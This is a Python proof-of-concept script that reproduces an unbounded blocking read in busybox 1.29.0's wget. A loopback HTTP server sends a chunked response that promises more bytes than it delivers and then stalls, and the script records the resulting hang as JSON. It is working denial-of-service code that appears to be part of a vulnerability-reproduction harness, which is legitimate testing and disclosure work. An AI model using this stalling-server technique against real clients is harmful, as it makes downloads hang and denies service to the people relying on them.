#!/usr/bin/env python3
"""
PoC for busybox 1.29.0 `wget` applet: unbounded blocking read (no read/idle
timeout) in the HTTP body/chunk retrieval state machine.

Trigger design
--------------
A minimal loopback HTTP server returns a well-formed chunked response whose
first (and only) chunk declares a size of 0x1000 bytes but delivers far fewer
bytes; the server then stalls, keeping the TCP connection open.  The target's
chunk parser (retrieve_file_data) issues a blocking fread() for the remaining
chunk bytes with no timeout of any kind, so the target blocks indefinitely
despite the transfer being permanently stalled.  A conforming client either
completes immediately (verified: full bodies exit at once even with the
socket held open) or must eventually time out; this target does neither.
The PoC kills the target at the per-run timeout (SIGKILL) and reports the
anomaly.

Everything is deterministic, single-connection, loopback-only, and the HTTP
payload is constructed in-memory at run time.
"""

import argparse
import json
import os
import shutil
import signal
import socket
import subprocess
import sys
import tempfile
import threading
import time

CHUNK_DECLARED = 0x1000   # bytes the chunk-size line promises
CHUNK_DELIVERED = 96      # bytes actually delivered before the stall


def build_response():
    """Dynamically construct the crafted HTTP response (not read from disk)."""
    chunk_header = ("%x\r\n" % CHUNK_DECLARED).encode("ascii")
    partial = bytes((0x41 + (i % 26)) for i in range(CHUNK_DELIVERED))
    return (
        b"HTTP/1.1 200 OK\r\n"
        b"Content-Type: application/octet-stream\r\n"
        b"Transfer-Encoding: chunked\r\n"
        b"Connection: close\r\n"
        b"\r\n"
        + chunk_header   # promise CHUNK_DECLARED bytes ...
        + partial        # ... deliver only a fraction, then stall forever
    )


def run_poc(binary, timeout):
    tmpdir = tempfile.mkdtemp(prefix="wget_poc_")
    outfile = os.path.join(tmpdir, "download.bin")
    response = build_response()

    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listener.bind(("127.0.0.1", 0))          # loopback only
    listener.listen(1)                       # single connection
    port = listener.getsockname()[1]

    server_state = {"accepted": False}

    def serve():
        try:
            listener.settimeout(timeout + 10)
            conn, _ = listener.accept()
            server_state["accepted"] = True
            conn.settimeout(timeout + 10)
            # Read the request headers.
            try:
                req = b""
                while b"\r\n\r\n" not in req and len(req) < 65536:
                    data = conn.recv(4096)
                    if not data:
                        break
                    req += data
            except OSError:
                pass
            # Send the crafted, bounded response, then stall.
            try:
                conn.sendall(response)
            except OSError:
                pass
            try:
                # Keep the connection open without sending the remaining
                # chunk bytes; returns once the (killed) client drops.
                while conn.recv(4096):
                    pass
            except OSError:
                pass
            finally:
                try:
                    conn.close()
                except OSError:
                    pass
        except OSError:
            pass
        finally:
            try:
                listener.close()
            except OSError:
                pass

    server_thread = threading.Thread(target=serve, daemon=True)
    server_thread.start()

    url = "http://127.0.0.1:%d/file" % port
    cmd = [binary, "wget", "-O", outfile, url]

    started = time.monotonic()
    timed_out = False
    error = None
    try:
        proc = subprocess.Popen(
            cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
    except OSError as exc:
        elapsed_ms = int((time.monotonic() - started) * 1000)
        try:
            listener.close()
        except OSError:
            pass
        server_thread.join(timeout=1)
        shutil.rmtree(tmpdir, ignore_errors=True)
        return {
            "binary": binary,
            "command": cmd,
            "returncode": None,
            "signal": None,
            "timed_out": False,
            "runtime_ms": elapsed_ms,
            "stdout": "",
            "stderr": "",
            "observable": {
                "kind": "custom",
                "value": "failed to launch target: %s" % exc,
                "path": None,
            },
            "error": "launch failed: %s" % exc,
        }

    try:
        stdout_b, stderr_b = proc.communicate(timeout=timeout)
    except subprocess.TimeoutExpired:
        timed_out = True
        proc.kill()  # SIGKILL: the target would otherwise hang forever
        stdout_b, stderr_b = proc.communicate()
    elapsed_ms = int((time.monotonic() - started) * 1000)
    returncode = proc.returncode

    server_thread.join(timeout=1)
    try:
        listener.close()
    except OSError:
        pass

    sig_name = None
    if returncode is not None and returncode < 0:
        try:
            sig_name = signal.Signals(-returncode).name
        except ValueError:
            sig_name = "SIG%d" % (-returncode)

    stdout_s = stdout_b.decode("utf-8", "replace")
    stderr_s = stderr_b.decode("utf-8", "replace")

    try:
        with open(outfile, "rb") as fh:
            file_bytes = len(fh.read())
    except OSError:
        file_bytes = 0
    shutil.rmtree(tmpdir, ignore_errors=True)

    if timed_out:
        value = (
            "UNBOUNDED BLOCK (no read/idle timeout, CWE-400): server sent a "
            "chunked response promising %d chunk bytes but delivered %d and "
            "stalled with the connection open; the target blocked %d ms in "
            "its chunk parser instead of failing or timing out, wrote only "
            "%d partial bytes to the output file, and had to be killed "
            "(%s). A complete transfer under identical conditions exits "
            "immediately, proving the block is caused by the stalled chunk, "
            "not by connection handling. stderr=%r"
            % (
                CHUNK_DECLARED,
                CHUNK_DELIVERED,
                elapsed_ms,
                file_bytes,
                sig_name,
                stderr_s.strip(),
            )
        )
        observable = {"kind": "custom", "value": value, "path": None}
    else:
        # Target exited on its own: report faithfully what was observed.
        observable = {
            "kind": "stderr",
            "value": stderr_s.strip() or stdout_s.strip(),
            "path": None,
        }
        if returncode not in (0, 1):
            error = None

    return {
        "binary": binary,
        "command": cmd,
        "returncode": returncode,
        "signal": sig_name,
        "timed_out": timed_out,
        "runtime_ms": elapsed_ms,
        "stdout": stdout_s,
        "stderr": stderr_s,
        "observable": observable,
        "error": error,
    }


def main():
    parser = argparse.ArgumentParser(
        description="PoC: busybox wget hangs forever on a stalled chunked body"
    )
    parser.add_argument("--binary", required=True, help="path to target binary")
    parser.add_argument(
        "--json-out", help="write JSON result here instead of stdout"
    )
    parser.add_argument(
        "--timeout",
        type=float,
        default=15.0,
        help="per-run timeout in seconds (default 15)",
    )
    args = parser.parse_args()

    result = run_poc(os.path.abspath(args.binary), args.timeout)
    payload = json.dumps(result, indent=2)
    if args.json_out:
        with open(args.json_out, "w") as fh:
            fh.write(payload + "\n")
    else:
        sys.stdout.write(payload + "\n")


if __name__ == "__main__":
    main()
